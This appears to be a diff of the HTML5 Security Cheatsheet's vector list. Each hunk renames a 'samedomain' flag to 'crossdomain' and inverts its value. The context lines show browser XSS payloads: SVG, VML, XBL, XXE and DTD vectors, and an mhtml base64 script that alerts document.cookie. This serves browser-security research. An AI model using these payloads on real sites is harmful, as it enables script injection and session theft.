@@ -1007,7 +1007,7 @@ var items =
         'data'       : '<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%vml_path%#xss></vmlframe>',
         'attachment' : {
             'required_mime' : '',
-            'samedomain'    : '0',            
+            'crossdomain'    : '1',            
             'path'          : '',
             'name'          : 'test.vml',
             'raw'           : '<xml>\r\n\t<rect style="height:100%;width:100%" id="xss" onmouseover="%js_alert%" strokecolor="white" strokeweight="2000px" filled="false" />\r\n</xml>'
@@ -1286,7 +1286,7 @@ var items =
         'data'       : '<?xml version="1.0" standalone="no"?><html xmlns="http://www.w3.org/1999/xhtml"><head><style type="text/css">@font-face {font-family: y; src: url("%svg_front_path%#x") format("svg");} body {font: 100px "y";}</style></head><body>Hello</body></html>',
         'attachment' : {
             'required_mime' : 'image/svg+xml',
-            'samedomain'    : '1',            
+            'crossdomain'    : '0',            
             'path'          : 'http://heideri.ch/jso/font.svg',
             'name'          : 'font.svg',
             'raw'           : '<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg onload="%js_alert%" xmlns="http://www.w3.org/2000/svg"><defs><font id="x"><font-face font-family="y"/></font></defs></svg>'
@@ -1322,7 +1322,7 @@ var items =
         'data'       : '<style>*[{}@import\'%css_path%?]</style>X',
         'attachment' : {
             'required_mime' : '',
-            'samedomain'    : '0',            
+            'crossdomain'    : '1',            
             'path'          : 'http://heideri.ch/jso/test.css',
             'name'          : 'test.css',
             'raw'           : '* {-o-link:\'%js_uri_alert%\';-o-link-source: current;}'
@@ -1573,7 +1573,7 @@ var items =
         'data'       : '<x style="behavior:url(%sct_path%)">',
         'attachment' : {
             'required_mime' : '',
-            'samedomain'    : '1',            
+            'crossdomain'    : '0',            
             'path'          : '',
             'name'          : 'test.sct',
             'raw'           : '<SCRIPTLET>\r\n\t<IMPLEMENTS Type="Behavior"></IMPLEMENTS>\r\n\t<SCRIPT Language="javascript">%js_alert%</SCRIPT>\r\n</SCRIPTLET>'
@@ -1609,7 +1609,7 @@ var items =
         'data'       : '<xml id="xss" src="%htc_path%"></xml>\r\n<label dataformatas="html" datasrc="#xss" datafld="payload"></label>',
         'attachment' : {
             'required_mime' : '',
-            'samedomain'    : '1',            
+            'crossdomain'    : '0',            
             'path'          : 'http://heideri.ch/jso/test.htc',
             'name'          : 'test.htc',
             'raw'           : '<?xml version="1.0"?>\r\n<x>\r\n<payload><![CDATA[<img src=x onerror=%js_alert%>]]></payload>\r\n</x>'
@@ -1858,7 +1858,7 @@ var items =
         'data'       : '<div x="javasc&#x0Aript:%js_alert%" style="\\000062\\00065\\68\\0\\00	\\000061 vior:url\\28#default#time2);\\-\\\n\\\n\\00006D\\0006f\\7A\\2d \\62	\\000069 \\06E ding:url(%xbl_path%#xss);\\-\\00006F\\0002d\\6C\n\\69 \\6e	\\00006B:attr(x);\\-\\00006F\\0002d\\6C\n\\69 \\6e	\\00006B-source:current" end=0 onend=%js_alert%>XXX',
         'attachment' : {
             'required_mime' : '',
-            'samedomain'    : '1',            
+            'crossdomain'    : '0',            
             'path'          : 'http://heideri.ch/jso/test.xbl',
             'name'          : 'test.xbl',
             'raw'           : '<?xml version="1.0" ?><bindings xmlns="http://www.mozilla.org/xbl"><binding id="xss"><implementation><constructor><![CDATA[%js_alert%]]></constructor></implementation></binding></bindings>'
@@ -1958,7 +1958,7 @@ var items =
         'data'       : '<!DOCTYPE x[<!ENTITY x SYSTEM "%xxe_path%">]><y>&x;</y>',
         'attachment' : {
             'required_mime' : '',
-            'samedomain'    : '1',            
+            'crossdomain'    : '0',            
             'path'          : '',
             'name'          : '',
             'raw'           : '<script xmlns="http://www.w3.org/1999/xhtml">%js_alert%</script>'
@@ -2236,7 +2236,7 @@ var items =
         'data'       : '<event-source src="%event_path%" onload="%js_alert%">',
         'attachment' : {
             'required_mime' : '',
-            'samedomain'    : '0',            
+            'crossdomain'    : '1',            
             'path'          : 'http://heideri.ch/jso/event.php',
             'name'          : 'event.php',
             'raw'           : '<?php\r\nheader("Content-Type: application/x-dom-event-stream");\r\ndie("Event: load\\ndata: \\n\\n");\r\n?>'
@@ -2330,7 +2330,7 @@ var items =
         'data'       : '<?xml-stylesheet type="text/css"?><!DOCTYPE x SYSTEM "test.dtd"><x>&x;</x>',
         'attachment' : {
             'required_mime' : '',
-            'samedomain'    : '0',            
+            'crossdomain'    : '1',            
             'path'          : 'http://heideri.ch/jso/test.dtd',
             'name'          : 'test.dtd',
             'raw'           : '<!ENTITY x "&#x3C;html:img&#x20;src=\'x\'&#x20;xmlns:html=\'http://www.w3.org/1999/xhtml\'&#x20;onerror=\'%js_alert%\'/&#x3E;">'
@@ -2395,7 +2395,7 @@ var items =
         'data'       : '<?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:%xdr_path%"/>',
         'attachment' : {
             'required_mime' : '',
-            'samedomain'    : '0',            
+            'crossdomain'    : '1',            
             'path'          : 'http://heideri.ch/jso/test.xdr',
             'name'          : 'test.xdr',
             'raw'           : '<?xml version="1.0"?>\n<Schema name="x" xmlns="urn:schemas-microsoft-com:xml-data">\n<ElementType name="img">\n<AttributeType name="src" required="yes" default="x"/>\n<AttributeType name="onerror" required="yes" default="%js_alert%"/>\n<attribute type="src"/>\n<attribute type="onerror"/>\n</ElementType>\n</Schema>'
@@ -2437,7 +2437,7 @@ var items =
         },
         'attachment' : {
             'required_mime' : '',
-            'samedomain'    : '0',            
+            'crossdomain'    : '1',            
             'path'          : 'http://heideri.ch/jso/test.swf',
             'name'          : 'test.swf',
             'raw'           : 'class XSS {public static function main() {\r\nflash.Lib.getURL(new flash.net.URLRequest("javascript:alert(1);"),"_top");\r\n}}'
@@ -2615,7 +2615,7 @@ var items =
         'data'       : '<x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="test.evt#x"/>',
         'attachment' : {
             'required_mime' : '',
-            'samedomain'    : '0',            
+            'crossdomain'    : '1',            
             'path'          : 'http://heideri.ch/jso/test.evt',
             'name'          : 'test.evt',
             'raw'           : '<script xmlns="http://www.w3.org/1999/xhtml" id="x">%js_alert%</script>'
@@ -2774,7 +2774,7 @@ var items =
         'data'       : '<div style=content:url(%svg_path_2%)></div>',
         'attachment' : {
             'required_mime' : 'image/svg+xml',
-            'samedomain'    : '1',            
+            'crossdomain'    : '0',            
             'path'          : 'http://heideri.ch/jso/test2.svg',
             'name'          : 'test2.svg',
             'raw'           : '<form xmlns="http://www.w3.org/1999/xhtml" target="_top" action="%js_uri_alert%"><input value="XXX" type="submit"/></form>'
@@ -2959,7 +2959,7 @@ var items =
         'data'       : 'mhtml:http://heideri.ch/jso/test.html!xss.html\nmhtml:http://heideri.ch/jso/test.gif!xss.html',
         'attachment' : {
             'required_mime' : '',
-            'samedomain'    : '0',            
+            'crossdomain'    : '1',            
             'path'          : 'http://heideri.ch/jso/test.html',
             'name'          : 'test.html',
             'raw'           : '<html>\n<body>\n<b>some content without two new line \\n\\n</b>\nContent-Type: multipart/related; boundary="******"<b>some content without two new line</b>\n--******\nContent-Location: xss.html\nContent-Transfer-Encoding: base64\n\nPGlmcmFtZSBuYW1lPWxvIHN0eWxlPWRpc3BsYXk6bm9uZT48L2lmcmFtZT4NCjxzY3JpcHQ+DQp1\ncmw9bG9jYXRpb24uaHJlZjtkb2N1bWVudC5nZXRFbGVtZW50c0J5TmFtZSgnbG8nKVswXS5zcmM9\ndXJsLnN1YnN0cmluZyg2LHVybC5pbmRleE9mKCcvJywxNSkpO3NldFRpbWVvdXQoImFsZXJ0KGZy\nYW1lc1snbG8nXS5kb2N1bWVudC5jb29raWUpIiwyMDAwKTsNCjwvc2NyaXB0PiAgICAg\n--\n</body>\n</html>'
@@ -3356,7 +3356,7 @@ var items =
         'data'       : '<svg xmlns="http://www.w3.org/2000/svg">\n<a id="x"><rect fill="white" width="1000" height="1000"/></a>\n<rect  fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/>\n</svg>',
         'attachment' : {
             'required_mime' : 'image/svg+xml',
-            'samedomain'    : '0',            
+            'crossdomain'    : '1',            
             'path'          : 'http://heideri.ch/jso/test3.svg',
             'name'          : 'test3.svg',
             'raw'           : '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">\n\n<clipPath id="a" >\n<set xlink:href="#x" attributeName="xlink:href" begin="1s" to="javascript:alert(1)" />\n</clipPath>\n\n<pattern id="b">\n<set xlink:href="#x" attributeName="xlink:href" begin="2s" to="javascript:alert(2)" />\n</pattern>\n\n<filter id="c">\n<set xlink:href="#x" attributeName="xlink:href" begin="3s" to="javascript:alert(3)" />\n</filter>\n\n<marker id="d">\n<set xlink:href="#x" attributeName="xlink:href" begin="4s" to="javascript:alert(4)" />\n</marker>\n\n<mask id="e">\n<set xlink:href="#x" attributeName="xlink:href" begin="5s" to="javascript:alert(5)" />\n</mask>\n\n<linearGradient id="f">\n<set xlink:href="#x" attributeName="xlink:href" begin="6s" to="javascript:alert(6)" />\n</linearGradient>\n\n</svg>'
@@ -3392,7 +3392,7 @@ var items =
         'data'       : '<svg xmlns="http://www.w3.org/2000/svg">\n\n<path d="M0,0" style="marker-start:url(test4.svg#a)"/>\n\n</svg>',
         'attachment' : {
             'required_mime' : 'image/svg+xml',
-            'samedomain'    : '0',            
+            'crossdomain'    : '1',            
             'path'          : 'http://heideri.ch/jso/test4.svg',
             'name'          : 'test4.svg',
             'raw'           : '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">\n<marker id="a"  markerWidth="1000" markerHeight="1000" refX="0" refY="0">\n<a xlink:href="http://google.com">\n<set attributeName="xlink:href" to="javascript:alert(1)" begin="1s" />\n<rect width="1000" height="1000" fill="white"/>\n</a>\n</marker>\n</svg>'
